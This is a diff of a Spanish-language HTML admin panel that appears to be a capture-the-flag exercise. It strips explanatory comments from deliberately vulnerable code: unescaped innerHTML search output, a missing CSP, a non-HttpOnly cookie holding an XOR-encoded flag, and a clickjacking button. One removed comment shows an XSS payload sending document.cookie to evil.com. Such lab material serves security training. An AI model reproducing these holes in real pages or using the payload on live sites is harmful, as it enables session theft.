@@ -4,10 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Control - Administración</title>
-    <!-- 🔴 VULNERABILIDAD: Falta CSP → Permite XSS, inyección de scripts maliciosos -->
-    <!-- Header que debería existir: 
-         Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 
-    -->
+  
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -110,17 +107,17 @@
         <h1>🔐 Panel Admin</h1>
         <p>Estado: <span class="status">● Activa</span></p>
         
-        <!-- === NUEVO: Buscador vulnerable a XSS === -->
+        
         <input type="text" id="searchInput" class="search-box" placeholder="🔍 Buscar usuario...">
         <button class="btn-secondary" onclick="buscarUsuario()">Buscar</button>
         <div id="searchResult" style="min-height: 20px; margin: 10px 0; color: #666;"></div>
         
-        <!-- Botón principal (Clickjacking target) -->
+        
         <button class="btn-danger" id="actionBtn">⚠️ ELIMINAR MI CUENTA</button>
         
         <div class="overlay-test">ID Nodo: 0x88234-AD</div>
         
-        <!-- === Panel educativo de vulnerabilidades === -->
+       
         <div class="vuln-panel">
             <strong>🔓 Cabeceras FALTANTES (Retos):</strong>
             <div class="vuln-item"><span class="vuln-icon">❌</span> X-Frame-Options → Clickjacking</div>
@@ -137,19 +134,9 @@
     </div>
 
     <script>
-        /**
-         * ============================================
-         * PANEL CTF - RETOS DE SEGURIDAD (v2.0)
-         * ============================================
-         * Vulnerabilidades demostradas:
-         * 🔴 1. Clickjacking (sin X-Frame-Options)
-         * 🔴 2. MIME Sniffing (sin X-Content-Type-Options) 
-         * 🔴 3. XSS via CSP ausente ← ¡NUEVO RETO!
-         * 🔴 4. Cookie sin HttpOnly
-         * 🔴 5. Cache sensible sin controles
-         */
+      
 
-        // === RETO XOR: Bandera cifrada ===
+        
         const _0xdata = [38, 44, 33, 39, 59, 35, 44, 41, 35, 43, 63, 42, 33, 35, 43, 59, 33, 46, 36, 59, 51, 52, 37, 33, 44, 31, 63, 18, 16, 24, 20, 5];
         const _0xkey = 72;
 
@@ -157,38 +144,38 @@
             return data.map(byte => String.fromCharCode(byte ^ key)).join('');
         }
 
-        // === RETO XSS: Buscador vulnerable (sin sanitización + sin CSP) ===
+       
         function buscarUsuario() {
             const input = document.getElementById('searchInput').value;
             const result = document.getElementById('searchResult');
             
-            // 🔴 VULNERABILIDAD: Inserción directa sin escapar + sin CSP que lo bloquee
-            // Un atacante podría inyectar: <script>fetch('https://evil.com?c='+document.cookie)</script>
+           
+            
             result.innerHTML = `🔎 Resultados para: <strong>${input}</strong>`;
             
-            // Bonus: Si el input contiene <script>, se ejecutará (porque no hay CSP)
+           
             if (input.includes('<script')) {
                 console.log("🎯 ¡XSS detectado! Sin CSP, el navegador ejecutó tu script.");
             }
         }
 
-        // Permitir Enter en el buscador
+       
         document.getElementById('searchInput').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') buscarUsuario();
         });
 
-        // === RETO MIME Sniffing ===
+      
         function cargarAvatar() {
             const fakeImage = document.createElement('script');
             fakeImage.src = "data:text/javascript,console.log('🎯 MIME_SNIFFED'); alert('MIME Sniffing: código ejecutado desde falsa imagen');";
             document.body.appendChild(fakeImage);
         }
 
-        // === Inicialización vulnerable ===
+        
         function initSession() {
             const flag = decryptFlag(_0xdata, _0xkey);
             
-            // 🔴 Cookie vulnerable: sin HttpOnly, sin Secure, SameSite=Lax
+            
             document.cookie = `session_token=${flag}; path=/; SameSite=Lax`;
             
             console.log("%c [🔐 CTF] Sistema cargado. 5 vulnerabilidades activas.", "color: #e74c3c; font-weight: bold;");
@@ -197,27 +184,15 @@
             console.log(`[💡 PISTA 3] Sin CSP, cualquier inline-script se ejecuta 🎯`);
         }
 
-        // === Event: Botón eliminar (Clickjacking target) ===
+        
         document.getElementById('actionBtn').addEventListener('click', () => {
             alert("⚠️ ACCIÓN CRÍTICA\n\n¿Estás viendo esto dentro de un <iframe> transparente?\n→ ¡CLICKJACKING EXITOSO!\n\n🔐 Sin X-Frame-Options, cualquier sitio puede embeberte.");
         });
 
-        // Activar MIME Sniffing al hover (una vez)
+        
         document.getElementById('actionBtn').addEventListener('mouseover', cargarAvatar, { once: true });
 
-        // === DEMO: Cómo se VERÍA con CSP activado (comentado para referencia) ===
-        /*
-        // Si el servidor enviara esta cabecera:
-        // Content-Security-Policy: default-src 'self'; script-src 'self';
         
-        // Entonces este script inline NO se ejecutaría:
-        // <script>alert('XSS blocked by CSP!')</script>
-        
-        // Y el buscador debería usar textContent en lugar de innerHTML:
-        // result.textContent = `Resultados para: ${input}`; // ✅ Seguro
-        */
-
-        // Iniciar
         window.addEventListener('DOMContentLoaded', initSession);
     </script>
 </body>
